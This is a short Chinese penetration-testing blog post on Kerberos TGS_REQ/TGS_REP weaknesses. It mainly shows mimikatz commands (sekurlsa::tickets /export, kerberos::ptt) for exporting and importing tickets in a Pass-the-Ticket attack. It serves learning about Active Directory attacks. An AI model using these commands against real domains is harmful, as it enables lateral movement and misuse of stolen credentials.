---
title: "TGS_REQ & TGS_REP所存在的安全问题"
date: 2020-11-12T11:38:47+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---


<!--more-->

# Pass The Ticket
两个步骤全是通过AS_REQ拿到的票据进行验证，那么完全可以只用这张票据来进行横向。

mimikatz使用

```
sekurlsa::tickets /export  // 导出本机票据
kerberos::list  // 查看本机票据
kerberos::purge  // 清除本机所有票据
kerberos::ptt c:\[0;86e204]-2-0-60a00000-Administrator@krbtgt-TEST.LOCAL.kirbi  // 导入票据
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/1019daf4-2de4-474a-5b69-b19e335019bd.png)

这里需要注意：我当前是win7普通本地管理员用户，mimikatz是用管理员权限起来的，那么在普通权限的cmd中klist是看不到mimikatz导入的票据的。踩了个大坑。

# 白银票据
放到后面和黄金票据一起说。

# 后文
因为没有搭建好委派的环境，而且理解的非常不透彻，所以下面的几部分都拖一拖。

1. kerberosting
2. 非约束委派
3. 约束委派
4. 基于资源的约束委派攻击


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**